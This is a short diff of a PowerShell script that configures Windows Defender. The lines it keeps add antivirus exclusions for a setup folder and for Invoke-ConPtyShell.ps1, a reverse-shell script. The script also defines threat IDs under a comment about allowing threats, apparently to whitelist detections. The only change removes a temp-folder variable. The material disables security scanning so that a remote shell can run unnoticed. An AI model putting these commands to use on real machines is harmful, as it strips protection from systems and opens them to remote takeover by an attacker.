@@ -3,7 +3,6 @@ $threat1 = "2147773719"
 $threat2 = "2147780248"
 
 #add Windows Defender Exclusions:
-$TempExcl = "C:\Users\$($env:UserName)\AppData\Local\Temp"
 Add-MpPreference -ExclusionPath C:\Windows\Setup\State, C:\Windows\Setup\State\Setup.ps1, C:\Windows\Setup\State\Invoke-ConPtyShell.ps1
 
 #add Windows Defender allowed threats
